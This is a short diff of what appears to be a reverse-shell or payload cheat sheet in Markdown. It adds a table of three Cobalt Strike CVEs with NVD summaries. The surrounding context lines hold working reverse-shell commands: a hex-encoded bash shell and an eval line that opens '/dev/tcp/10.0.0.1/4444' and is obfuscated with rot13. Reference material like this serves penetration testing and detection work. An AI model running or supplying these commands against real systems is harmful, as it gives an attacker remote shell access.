@@ -1164,3 +1164,15 @@ echo -e "\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x6
 # Using eval with encoded command
 eval $(echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | rot13)
 ```
+
+---
+
+### Known C2/Payload Tooling CVEs (NVD-verified, v0.3.2)
+
+All IDs verified against the NVD API on 2026-09-07 before inclusion.
+
+| CVE | Product | CVSS | Summary (from NVD record) |
+|-----|---------|------|----------------------------|
+| CVE-2022-42948 | helpsystems/cobalt_strike | 9.8 | Cobalt Strike 4.7.1 fails to properly escape HTML tags when they are displayed on Swing components. By inject… |
+| CVE-2021-36798 | helpsystems/cobalt_strike | 7.5 | A Denial-of-Service (DoS) vulnerability was discovered in Team Server in HelpSystems Cobalt Strike 4.2 and 4.… |
+| CVE-2022-39197 | helpsystems/cobalt_strike | 6.1 | An XSS (Cross Site Scripting) vulnerability was found in HelpSystems Cobalt Strike through 4.7 that allowed a… |
